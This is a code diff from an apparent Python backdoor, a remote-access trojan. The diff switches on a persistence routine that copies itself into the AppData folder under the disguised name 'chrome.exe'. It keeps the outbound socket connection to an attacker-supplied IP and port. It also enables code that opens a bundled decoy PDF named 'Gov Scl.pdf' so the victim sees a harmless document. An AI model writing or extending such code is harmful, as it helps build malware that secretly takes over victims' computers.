@@ -8,11 +8,11 @@ import shutil
 
 class Backdoor:
     def __init__(self,ip,port):
-        # self.retention()
+        self.persistence()
         self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.connection.connect((ip,port))
 
-    def retention(self):
+    def persistence(self):
         
         file_loc = os.environ["appdata"] + "\\chrome.exe"
         if not os.path.exists(file_loc):
@@ -87,8 +87,8 @@ class Backdoor:
             self.send(data)
 
 
-# file= sys._MEIPASS + "Gov Scl.pdf"
-# subprocess.Popen(file,shell=True)
+file= sys._MEIPASS + "Gov Scl.pdf"
+subprocess.Popen(file,shell=True)
 
 while 1:
     try:
